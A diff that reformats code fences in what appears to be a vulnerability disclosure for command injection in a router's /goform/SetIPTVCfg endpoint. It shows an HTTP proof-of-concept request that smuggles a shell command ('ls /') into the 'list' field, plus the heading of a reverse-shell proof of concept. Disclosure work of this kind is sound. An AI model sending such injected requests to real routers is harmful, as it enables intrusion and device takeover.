@@ -30,7 +30,7 @@ By injecting special characters (e.g., "; , #), attackers can escape the quoted 
 ## Proof of Concept (PoC)
 
 ### PoC 1: List Root Directory (`ls /`)
-```http
+```
 POST /goform/SetIPTVCfg HTTP/1.1
 Host: 192.168.x.x
 Cache-Control: max-age=0
@@ -49,7 +49,8 @@ list=abc"; ls /"
 ![PoC 2 Result: Root Directory Listing](./imgs/2.png)
 
 ### PoC 2: Reverse shell
-```POST /goform/SetIPTVCfg HTTP/1.1
+```
+POST /goform/SetIPTVCfg HTTP/1.1
 Host: 192.168.x.x
 Cache-Control: max-age=0
 Accept-Language: en-US,en;q=0.9
